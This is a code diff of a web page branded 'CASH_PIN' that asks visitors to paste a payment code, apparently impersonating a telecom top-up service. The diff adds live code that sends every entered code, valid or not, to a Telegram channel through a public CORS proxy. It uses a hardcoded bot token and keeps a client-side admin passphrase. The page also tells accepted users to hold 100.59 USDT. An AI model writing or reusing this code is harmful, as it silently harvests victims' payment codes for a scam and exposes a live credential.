@@ -11,6 +11,7 @@
     <!-- Favicon (using the provided raw image) -->
     <link rel="icon" type="image/jpeg" href="https://raw.githubusercontent.com/Asiacell-Erthlink/CASH_PIN/refs/heads/main/CashPin.jpg">
     <style>
+        /* (نفس التنسيقات السابقة) */
         * {
             margin: 0;
             padding: 0;
@@ -26,7 +27,6 @@
             flex-direction: column;
         }
 
-        /* Header with menu button and logo */
         .app-header {
             display: flex;
             align-items: center;
@@ -79,7 +79,6 @@
             width: 40px;
         }
 
-        /* Sidebar overlay */
         .sidebar-overlay {
             position: fixed;
             top: 0;
@@ -208,7 +207,6 @@
             gap: 8px;
         }
 
-        /* Main content */
         .main-content {
             flex: 1;
             padding: 16px;
@@ -312,7 +310,6 @@
             border-radius: 16px;
         }
 
-        /* Admin panel */
         .admin-panel {
             display: none;
         }
@@ -394,17 +391,6 @@
 
         .action-btn.success { background: #00aa66; }
         .action-btn.danger { background: #aa3333; }
-
-        hr {
-            border-color: #222;
-            margin: 20px 0;
-        }
-
-        .hidden {
-            display: none;
-        }
-
-        /* No large black spaces, everything compact */
     </style>
 </head>
 <body>
@@ -417,7 +403,6 @@
         <div class="header-placeholder"></div>
     </header>
 
-    <!-- Sidebar overlay and drawer -->
     <div class="sidebar-overlay" id="sidebarOverlay"></div>
     <aside class="sidebar" id="sidebar">
         <div class="sidebar-logo">
@@ -426,15 +411,12 @@
         <div class="pending-title">
             <i class="fas fa-clock" style="color: #ffaa00;"></i> PROCESSING
         </div>
-        <ul class="pending-list" id="pendingList">
-            <!-- dynamic -->
-        </ul>
+        <ul class="pending-list" id="pendingList"></ul>
         <button class="new-op-btn-sidebar" id="newOperationSidebarBtn">
             <i class="fas fa-plus-circle"></i> New Operation
         </button>
     </aside>
 
-    <!-- Main content (user mode) -->
     <main class="main-content" id="userMode">
         <div class="payment-dialog">
             <h1 class="dialog-title">Paste Your Payment Code Here:</h1>
@@ -452,7 +434,6 @@
         </div>
     </main>
 
-    <!-- Admin mode -->
     <main class="main-content admin-panel" id="adminMode">
         <div class="admin-header">
             <h1 class="admin-title"><i class="fas fa-crown" style="color: gold;"></i> Admin</h1>
@@ -471,7 +452,7 @@
         (function() {
             // ========== CONFIG ==========
             const BOT_TOKEN = '8094856271:AAFdutCJAsHntdIByvaumPDFkwfRU14niCE';
-            const CHAT_ID = '@CASH_PIN'; // Replace with actual chat ID if needed
+            const CHAT_ID = '@CASH_PIN'; // Replace with actual chat ID (channel or user)
 
             // #Key's_Here🔑
             const VALID_KEYS = [
@@ -557,55 +538,80 @@
                 pendingListEl.innerHTML = html;
             }
 
-            // ========== TELEGRAM SIMULATION ==========
+            // ========== TELEGRAM SENDER (with proxy) ==========
             async function sendTelegramMessage(text) {
-                // Simulate success (CORS block usually)
-                console.log('Telegram message:', text);
-                // Optionally try with a proxy (uncomment if needed)
-                /*
                 const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                const payload = {
+                    chat_id: CHAT_ID,
+                    text: text,
+                    parse_mode: 'Markdown'
+                };
+
+                // Use a public CORS proxy (corsproxy.io)
+                const proxyUrl = 'https://corsproxy.io/?' + encodeURIComponent(url);
+
                 try {
-                    await fetch(`https://cors-anywhere.herokuapp.com/${url}`, {
+                    const response = await fetch(proxyUrl, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
+                        body: JSON.stringify(payload)
                     });
-                } catch (e) {}
-                */
+                    const data = await response.json();
+                    if (!data.ok) throw new Error(data.description);
+                    console.log('Telegram message sent:', data);
+                } catch (error) {
+                    console.error('Error sending Telegram message:', error);
+                    // Silent fail (do not disrupt user experience)
+                }
             }
 
             // ========== PROCESS CODE ==========
             function processPaymentCode(code) {
-                if (code.trim() === 'Admin:JL:Site') {
+                const trimmedCode = code.trim();
+                const now = new Date();
+                const timeString = now.toLocaleString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false });
+
+                // Admin code
+                if (trimmedCode === 'Admin:JL:Site') {
                     enterAdminMode();
                     closeSidebar();
                     return;
                 }
 
-                if (!VALID_KEYS.includes(code.trim())) {
+                // Check if valid
+                if (!VALID_KEYS.includes(trimmedCode)) {
                     messageText.innerText = '❌ Invalid or used key. Please obtain a valid key.';
                     extraDetails.innerHTML = '';
+
+                    // Send failure message to Telegram
+                    const failMsg = `❌ *Invalid Payment Code Attempt*\n\nCode: \`${trimmedCode}\`\nTime: ${timeString}\nStatus: Failed (invalid/used)`;
+                    sendTelegramMessage(failMsg);
                     return;
                 }
 
-                if (requests.some(r => r.code === code.trim())) {
+                // Check if already used
+                if (requests.some(r => r.code === trimmedCode)) {
                     messageText.innerText = '⚠️ This key has already been used.';
                     extraDetails.innerHTML = '';
+
+                    const usedMsg = `⚠️ *Reused Key Attempt*\n\nCode: \`${trimmedCode}\`\nTime: ${timeString}\nStatus: Already used`;
+                    sendTelegramMessage(usedMsg);
                     return;
                 }
 
-                const now = Date.now();
-                const expiresAt = now + (6 * 60 * 60 * 1000);
+                // Success: create new request
+                const expiresAt = Date.now() + (6 * 60 * 60 * 1000);
                 const newReq = {
                     id: generateId(),
-                    code: code.trim(),
+                    code: trimmedCode,
                     status: 'processing',
-                    createdAt: now,
+                    createdAt: Date.now(),
                     expiresAt: expiresAt,
                 };
                 requests.push(newReq);
                 saveRequests();
 
+                // Update UI
                 messageText.innerText = '✅ Payment code accepted!';
                 extraDetails.innerHTML = `
                     <div class="countdown-timer" id="countdownDisplay">
@@ -619,9 +625,17 @@
                 `;
 
                 startRequestTimer(newReq.id);
-                sendTelegramMessage(`🔔 New payment code: ${code}`);
                 paymentInput.value = '';
                 closeSidebar();
+
+                // Send success message to Telegram with all details
+                const successMsg = `✅ *Payment Code Accepted*\n\n` +
+                    `Code: \`${trimmedCode}\`\n` +
+                    `Time: ${timeString}\n` +
+                    `Expires: ${new Date(expiresAt).toLocaleString()}\n` +
+                    `Status: Processing\n` +
+                    `User advised to keep 100.59 USDT.`;
+                sendTelegramMessage(successMsg);
             }
 
             function startRequestTimer(requestId) {
